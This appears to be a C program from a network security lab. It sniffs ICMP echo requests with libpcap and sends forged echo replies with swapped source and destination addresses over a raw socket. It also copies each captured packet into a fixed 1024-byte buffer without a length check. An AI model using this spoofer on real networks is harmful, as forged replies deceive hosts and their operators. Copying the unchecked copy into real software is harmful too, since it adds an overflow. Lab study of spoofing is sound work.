#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <arpa/inet.h>

// https://medium.com/@sundaeGAN/ip-spoofing-and-why-checksum-is-in-need-with-c-lang-8829358adf3b
u_short cal_chksum(u_short* buffer, int size){
    unsigned long checksum = 0;
    while (size > 1){
        checksum += *buffer++;
        size -= sizeof(u_short);
    }
    if (size){
        checksum += *(u_char*) buffer;
    }
    checksum = (checksum >> 16) + (checksum & 0xFFFF);
    checksum += (checksum >> 16);
    return (u_short)(~checksum);
}

// The following code is from https://github.com/mtcp-stack/mtcp/blob/master/mtcp/src/icmp.c
uint16_t ICMPChecksum(uint16_t *icmph, int len)
{
	assert(len >= 0);
	
	uint16_t ret = 0;
	uint32_t sum = 0;
	uint16_t odd_byte;
	
	while (len > 1) {
		sum += *icmph++;
		len -= 2;
	}
	
	if (len == 1) {
		*(uint8_t*)(&odd_byte) = * (uint8_t*)icmph;
		sum += odd_byte;
	}
	
	sum =  (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	ret =  ~sum;
	
	return ret; 
}

/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN	6

// This struct is copied from the following website:
// https://www.tcpdump.org/pcap.html

/* IP header */
struct sniff_ip {
	u_char ip_vhl;		/* version << 4 | header length >> 2 */
	u_char ip_tos;		/* type of service */
	u_short ip_len;		/* total length */
	u_short ip_id;		/* identification */
	u_short ip_off;		/* fragment offset field */
#define IP_RF 0x8000		/* reserved fragment flag */
#define IP_DF 0x4000		/* don't fragment flag */
#define IP_MF 0x2000		/* more fragments flag */
#define IP_OFFMASK 0x1fff	/* mask for fragmenting bits */
	u_char ip_ttl;		/* time to live */
	u_char ip_p;		/* protocol */
	u_short ip_sum;		/* checksum */
	struct in_addr ip_src,ip_dst; /* source and dest address */
};
#define IP_HL(ip)		(((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)		(((ip)->ip_vhl) >> 4)

// This ICMP struct is copied from https://github.com/kevin-w-du/BookCode/blob/master/Sniffing_Spoofing/C_spoof/myheader.h
/* ICMP Header  */
struct icmpheader {
  unsigned char icmp_type; // ICMP message type
  unsigned char icmp_code; // Error code
  unsigned short int icmp_chksum; //Checksum for ICMP Header and data
  unsigned short int icmp_id;     //Used for identifying request
  unsigned short int icmp_seq;    //Sequence number
};


/* This function will be invoked by pcap for each captured packet.
We can process each packet inside the function.
 */
void got_packet(u_char *args, const struct pcap_pkthdr *header,
        const u_char *packet)
{
   int sd;
   struct sockaddr_in sin;
   char buffer[1024];

   memset(buffer, 0, 1024);
   int packet_size = header->len; // Getting packet size



   sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
   if(sd < 0) {
     perror("socket() error"); exit(-1);
   }

   sin.sin_family = AF_INET;

   printf("Got a packet\n");

   char src[100];
   char dst[100];
   
   // The IP header field used to extract the values of sniffed packets
   struct sniff_ip *ip;
   ip = (struct sniff_ip*)(packet + 14);

   // Copying the IP header as well as upper layer layers (such as ICMP header and Payload) to a datastructure (buffer) that we use for spoofing packets
   memcpy((char*)buffer, ip, (packet_size - 14));

   // Assining parts of the buffer to IP and ICMP headers
   struct sniff_ip *spoofed_ip = (struct sniff_ip*)buffer;
   struct icmpheader *icmp = (struct icmpheader*)(buffer + sizeof(struct sniff_ip));

   // Spoofing ICMP and IP header fields
   icmp->icmp_type = 0;

   sin.sin_addr = ip->ip_src;
   
   icmp->icmp_chksum = 0;
   icmp->icmp_chksum = ICMPChecksum((uint16_t*)icmp, (packet_size - 14 - sizeof(struct sniff_ip)));

   
   spoofed_ip->ip_vhl = 4 << 4 | sizeof(struct sniff_ip) >> 2;
   spoofed_ip->ip_p = IPPROTO_ICMP;

   spoofed_ip->ip_src = ip->ip_dst;
   spoofed_ip->ip_dst = ip->ip_src;
   spoofed_ip->ip_ttl = 254;
   spoofed_ip->ip_len = htons(packet_size);
   

   size_t ip_len = packet_size;

   strcpy(src, inet_ntoa(spoofed_ip->ip_src));
   strcpy(dst, inet_ntoa(spoofed_ip->ip_dst));
   
   printf("source ip: %s, destination ip: %s\n", src, dst);

   printf("%ld\n", ip_len);
   if(sendto(sd, buffer, ip_len, 0, (struct sockaddr *)&sin,
          sizeof(sin)) < 0) {
   perror("sendto() error"); exit(-1);
   }
   printf("One packet sent!\n");
   
}

int main() {
  pcap_t *handle;
  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fp;
  char filter_exp[] = "icmp";
  bpf_u_int32 net;
  // Step 1: Open live pcap session on NIC with name eth3.
  //         Students need to change "eth3" to the name found on their own
  //         machines (using ifconfig). The interface to the 10.9.0.0/24
  //         network has a prefix "br-" (if the container setup is used).
  handle = pcap_open_live("br-6dd48200fcae", BUFSIZ, 1, 1000, errbuf);
  printf("Works without root privilege.\n");
  // Step 2: Compile filter_exp into BPF psuedo-code
  pcap_compile(handle, &fp, filter_exp, 0, net);
  printf("Works without root privilege?\n");
  if (pcap_setfilter(handle, &fp) !=0) {
    pcap_perror(handle, "Error:");
    exit(EXIT_FAILURE);
  }
  // Step 3: Capture packets
  pcap_loop(handle, -1, got_packet, NULL);
  pcap_close(handle);   //Close the handle
  return 0;
}